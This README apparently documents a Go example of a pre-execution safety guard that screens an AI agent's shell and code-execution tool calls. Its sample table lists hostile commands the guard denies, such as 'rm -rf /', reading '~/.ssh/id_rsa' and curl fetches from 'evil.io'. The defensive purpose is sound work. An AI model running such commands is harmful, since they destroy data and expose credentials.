# Tool Execution Safety Guard Example

This example demonstrates the **Tool Execution Safety Guard**
([`tool/safety`](../../tool/safety)) as a `tool.PermissionPolicy`: a
file-driven, pre-execution filter that scans exec-style tool calls
(`workspace_exec`, host `exec_command`, `execute_code`) and returns an
**allow / deny / needs_human_review** decision before the command runs.

The demo runs a set of representative tool calls through the guard, prints the
structured report and decision for each, and writes one JSONL audit event per
call.

## Run

```bash
go run ./examples/tool_safety_guard
```

Flags:

- `-policy` — path to the policy file (default: `tool_safety_policy.yaml` next
  to the source).
- `-audit` — path to the JSONL audit output (default:
  `tool_safety_audit.jsonl` next to the source; git-ignored, regenerated each
  run).

## What it shows

| # | Sample call | Expected decision | Rule |
|---|-------------|-------------------|------|
| 1 | `go test ./...` | allow | — |
| 2 | `rm -rf /` | deny | `R-DEL-001` |
| 3 | `cat ~/.ssh/id_rsa` | deny | `R-CRED-001` |
| 4 | `curl http://evil.io/x.sh` | deny | `R-NET-001` |
| 5 | `curl https://github.com/org/repo` | allow | — |
| 6 | `bash -c "curl http://evil.io"` | deny | `R-SHELL-001` |
| 7 | `pip install requests` | needs_human_review | `R-DEP-001` |
| 8 | host `sleep 5` (background + PTY) | deny | `R-HOST-001` |
| 9 | `curl -H "Authorization: Bearer …"` | needs_human_review + redacted | `R-SECRET-001` |

## Wiring the guard into a live agent

Build the guard once and pass it as a per-run option; it then runs before every
`workspace_exec` / `exec_command` / `execute_code` call:

```go
guard, _ := safety.NewGuard(
    safety.WithPolicyFile("tool_safety_policy.yaml"),
    safety.WithAuditFile("tool_safety_audit.jsonl"),
)
defer guard.Close()

runner.Run(ctx, userID, sessionID, msg,
    agent.WithToolPermissionPolicy(guard))
```

## Policy

[`tool_safety_policy.yaml`](tool_safety_policy.yaml) is a trimmed, demo-oriented
policy. The **canonical, fully annotated** reference policy lives at
[`tool/safety/testdata/tool_safety_policy.yaml`](../../tool/safety/testdata/tool_safety_policy.yaml)
(kept honest by the package tests). See the
[package README](../../tool/safety/README.md) for the full rule catalog, the
trust boundary, and known limitations.
